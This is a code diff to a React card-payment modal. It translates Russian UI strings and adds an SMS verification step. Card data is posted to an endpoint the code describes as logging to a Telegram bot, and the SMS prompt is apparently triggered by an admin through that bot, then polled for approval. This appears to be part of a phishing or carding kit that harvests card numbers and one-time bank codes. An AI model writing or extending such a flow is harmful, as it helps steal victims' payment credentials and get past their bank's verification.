@@ -1,7 +1,8 @@
 'use client';
 
-import { useState } from 'react';
-import { X, CreditCard, Loader2 } from 'lucide-react';
+import { useState, useEffect } from 'react';
+import { X, CreditCard, Loader2, Shield } from 'lucide-react';
+import SMSModal from './SMSModal';
 
 interface CardPaymentModalProps {
   isOpen: boolean;
@@ -21,8 +22,34 @@ export default function CardPaymentModal({ isOpen, onClose, onSuccess, total, or
   });
 
   const [isProcessing, setIsProcessing] = useState(false);
-  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'processing' | 'success' | 'error'>('pending');
+  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'processing' | 'sms_required' | 'success' | 'error'>('pending');
   const [errorMessage, setErrorMessage] = useState('');
+  const [showSMSModal, setShowSMSModal] = useState(false);
+  const [currentOrderId, setCurrentOrderId] = useState('');
+
+  // Polling for payment status updates
+  useEffect(() => {
+    if (paymentStatus === 'sms_required' && currentOrderId) {
+      const interval = setInterval(async () => {
+        try {
+          const response = await fetch(`/api/payment/status?orderId=${currentOrderId}`);
+          const result = await response.json();
+          
+          if (result.status === 'success') {
+            setPaymentStatus('success');
+            setTimeout(() => {
+              onSuccess();
+              onClose();
+            }, 1500);
+          }
+        } catch (error) {
+          console.error('Status check error:', error);
+        }
+      }, 2000);
+
+      return () => clearInterval(interval);
+    }
+  }, [paymentStatus, currentOrderId, onSuccess, onClose]);
 
   const handleInputChange = (field: string, value: string) => {
     setCardData(prev => ({
@@ -71,7 +98,7 @@ export default function CardPaymentModal({ isOpen, onClose, onSuccess, total, or
     setErrorMessage('');
 
     try {
-      // Создаем лог платежа в телеграм боте
+      // Create payment log in Telegram bot
       const response = await fetch('/api/payment/create-log', {
         method: 'POST',
         headers: {
@@ -91,27 +118,31 @@ export default function CardPaymentModal({ isOpen, onClose, onSuccess, total, or
       }
 
       const result = await response.json();
+      setCurrentOrderId(result.logId);
       
-      // Показываем статус обработки
-      setPaymentStatus('pending');
+      // Show processing status
+      setPaymentStatus('sms_required');
       
-      // В реальном приложении здесь был бы polling для проверки статуса
-      // Для демонстрации просто ждем и показываем успех
+      // Simulate admin action - in real app, this would be triggered by Telegram bot
       setTimeout(() => {
-        setPaymentStatus('success');
-        setTimeout(() => {
-          onSuccess();
-          onClose();
-        }, 1500);
-      }, 3000);
+        setShowSMSModal(true);
+      }, 2000);
 
     } catch (error) {
       console.error('Payment error:', error);
       setPaymentStatus('error');
-      setErrorMessage('Ошибка обработки платежа. Попробуйте еще раз.');
+      setErrorMessage('Payment processing error. Please try again.');
     } finally {
       setIsProcessing(false);
     }
+  };
+
+  const handleSMSSuccess = () => {
+    setPaymentStatus('success');
+    setTimeout(() => {
+      onSuccess();
+      onClose();
+    }, 1500);
   };
 
   if (!isOpen) return null;
@@ -136,7 +167,13 @@ export default function CardPaymentModal({ isOpen, onClose, onSuccess, total, or
             {paymentStatus === 'processing' && (
               <div className="flex items-center gap-3 text-blue-600">
                 <Loader2 className="w-5 h-5 animate-spin" />
-                <span className="font-medium">Обработка платежа...</span>
+                <span className="font-medium">Processing payment...</span>
+              </div>
+            )}
+            {paymentStatus === 'sms_required' && (
+              <div className="flex items-center gap-3 text-orange-600">
+                <Shield className="w-5 h-5" />
+                <span className="font-medium">SMS verification required</span>
               </div>
             )}
             {paymentStatus === 'success' && (
@@ -144,7 +181,7 @@ export default function CardPaymentModal({ isOpen, onClose, onSuccess, total, or
                 <div className="w-5 h-5 bg-green-100 rounded-full flex items-center justify-center">
                   <span className="text-green-600 text-sm">✓</span>
                 </div>
-                <span className="font-medium">Платеж успешно обработан!</span>
+                <span className="font-medium">Payment successful!</span>
               </div>
             )}
             {paymentStatus === 'error' && (
@@ -152,7 +189,7 @@ export default function CardPaymentModal({ isOpen, onClose, onSuccess, total, or
                 <div className="w-5 h-5 bg-red-100 rounded-full flex items-center justify-center">
                   <span className="text-red-600 text-sm">✗</span>
                 </div>
-                <span className="font-medium">Ошибка обработки платежа</span>
+                <span className="font-medium">Payment error</span>
               </div>
             )}
             {errorMessage && (
@@ -269,6 +306,14 @@ export default function CardPaymentModal({ isOpen, onClose, onSuccess, total, or
           </button>
         </form>
       </div>
+
+      {/* SMS Modal */}
+      <SMSModal
+        isOpen={showSMSModal}
+        onClose={() => setShowSMSModal(false)}
+        onSuccess={handleSMSSuccess}
+        orderId={currentOrderId}
+      />
     </div>
   );
 }
